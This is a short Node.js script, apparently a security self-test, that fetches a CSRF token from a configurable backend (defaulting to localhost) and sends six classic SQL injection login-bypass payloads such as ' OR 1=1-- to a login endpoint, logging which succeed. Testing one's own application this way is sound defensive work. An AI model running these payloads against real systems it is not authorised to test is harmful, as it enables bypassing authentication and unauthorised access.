const axios = require("axios");

// SQL Injection simulation on login form
// This script attempts to login with classic SQL injection payloads

// Configure backend origin: respect BACKEND_ORIGIN env or default to local dev
const ORIGIN = process.env.BACKEND_ORIGIN || "http://localhost:3001";
const LOGIN_URL = `${ORIGIN}/api/auth/login`;
const CSRF_URL = `${ORIGIN}/api/csrf-token`;

async function getCsrfHeaders() {
  const { data } = await axios.get(CSRF_URL);
  const token = data.csrfToken;
  return {
    headers: {
      "x-csrf-token": token,
      Cookie: `XSRF-TOKEN=${token}`,
      "Content-Type": "application/json",
    },
    timeout: 10000,
    validateStatus: () => true,
  };
}

async function sqlInjectionAttack() {
  console.log("Starting SQL Injection attack simulation...");
  console.log(`Backend: ${ORIGIN}`);

  const payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1' /*",
  ];

  const baseConfig = await getCsrfHeaders();

  for (let i = 0; i < payloads.length; i++) {
    const payload = payloads[i];
    const response = await axios.post(
      LOGIN_URL,
      {
        email: payload,
        password: "anything",
      },
      baseConfig
    );

    if (response.status >= 200 && response.status < 300) {
      console.log(`Payload ${i + 1}: SUCCESS - Response:`, response.data);
    } else {
      const msg =
        response.data && response.data.error
          ? response.data.error
          : `HTTP ${response.status}`;
      console.log(`Payload ${i + 1}: FAILED - ${msg}`);
    }
  }

  console.log("SQL Injection simulation completed.");
}

sqlInjectionAttack().catch(console.error);
